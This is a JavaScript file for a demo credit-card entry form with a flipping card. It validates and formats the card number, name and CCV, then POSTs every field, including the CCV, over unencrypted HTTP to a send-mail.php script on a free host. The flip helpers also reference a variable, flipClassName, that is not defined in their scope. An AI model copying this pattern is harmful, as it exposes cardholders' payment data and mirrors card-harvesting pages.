let inputs = document.getElementsByClassName('isValidate');
addEventListnersToInputs(inputs);
createMonth();
createYear();


function createMonth() {
    let month = '';
    for (let i = 1; i <= 12; i++) {
        month += '<option value=' + i + '>' + i + '</option>';
    }
    document.getElementById('month').innerHTML = month;
}

function createYear() {

    let yearSelectBox = '';
    let currentYear = new Date().getFullYear();

    console.log(currentYear);

    for (let i = 0; i <= 30; i++) {
        let year = currentYear + i;
        yearSelectBox += '<option value=' + year + '>' + year + '</option>';
    }
    document.getElementById('year').innerHTML = yearSelectBox;
}


function defineBank(e) {
    if (e == 4) {
        document.getElementById('bank').className = 'visa';
    }
    if (e == 5) {
        document.getElementById('bank').className = 'master';
    }

};

function onKeyUp(e) {

    let validateParams = null;
    switch (e.target.id) {
        case 'number':
            {
                validateParams = {
                    RegExpString: "[0-9]",
                    UppedKeyCode: e.keyCode,
                    Separator: ' ',
                    MaxSymbolsCount: 16,
                    NumbersBlockLenght: 4
                }
                break;
            }

        case 'name':
            {
                validateParams = {
                    RegExpString: "[a-zA-Z\\s]",
                    IsUpperCase: true
                }
                break;
            }

        case 'ccv':
            {
                validateParams = {
                    RegExpString: "[0-9]",
                    MaxSymbolsCount: 3
                }
                break;
            }
    }

    e.target.value = validateParams ? inputValidate(e.target.value, validateParams) : '';
    defineBank(e.target.value.substring(0, 1));
}

function inputValidate(value, validateParams) {
    var regexp = new RegExp(validateParams.RegExpString, 'g')
    let validInput = '';
    let backspaceKeyCode = 8;

    let validCharsArray = value.match(regexp);

    if (validCharsArray) {
        validCharsArray.forEach(function (char, index) {
            let currentCharNumber = index + 1;

            if (currentCharNumber > validateParams.MaxSymbolsCount) {
                return;
            }

            validInput += char;

            if (validateParams.Separator) {
                if (currentCharNumber % validateParams.NumbersBlockLenght == 0 &&
                    currentCharNumber != validateParams.MaxSymbolsCount) {
                    validInput += validateParams.Separator;
                }
            }
        });

        if (validateParams.Separator) {
            if (validateParams.UppedKeyCode == backspaceKeyCode &&
                validInput.slice(-1) == validateParams.Separator) {
                validInput = validInput.slice(0, validInput.length - 1);
            }
        }
    }

    return validateParams.IsUpperCase ? validInput.toUpperCase() : validInput;
}

function addEventListnersToInputs(inputs) {
    let inputsArray = Array.from(inputs);
    inputsArray.forEach(function (input) {
        input.addEventListener('keyup', {
            handleEvent: onKeyUp
        })
    });
}

function cardFlip() {
    let card = document.getElementById('card');
    card.classList.toggle('flip');
}

function toggleToFront(){
    if(document.getElementById('card').className.includes(flipClassName)) {
        document.getElementById('card').classList.remove(flipClassName);
    }
}

function toggleToBack(){
    if(!document.getElementById('card').className.includes(flipClassName)) {
        document.getElementById('card').classList.add(flipClassName);
    }
}

function sendData() {
    let errors = '';
    let flipClassName = 'flip';
    if (document.getElementById('number').value.length < 19) {
        toggleToFront();
        errors += 'Заполните поле номер карты \n';
    }

    if (document.getElementById('ccv').value.length < 3) {
        toggleToBack();
        errors += 'Заполните поле ccv \n';
    }

    if (document.getElementById('name').value.length < 2) {
        toggleToFront();
        errors += 'Введите корректное имя \n';
    }

    if (errors) {
        alert('Ошибка \n' + errors);
        return;
    }

    let paramsString = getParamsString();
    let requestSendedStatus = 4;
    let xhr = new XMLHttpRequest();

    xhr.onreadystatechange = function () {
        if (xhr.readyState == requestSendedStatus) {
            if (xhr.responseText == 'ok') {
                alert('Данные успешно отправленны');
            } else {
                alert('Что-то пошло не так');
            }
        }
    }

    xhr.open('POST', 'http://3dcard.000webhostapp.com/send-mail.php');
    xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    xhr.send(paramsString);
}

function getParamsString() {
    let params = '';
    let el = document.querySelectorAll('input');
    el.forEach(function (e) {
        params += e.id + '=' + e.value + '&';
    })

    return params.substring(0, params.length - 1);
}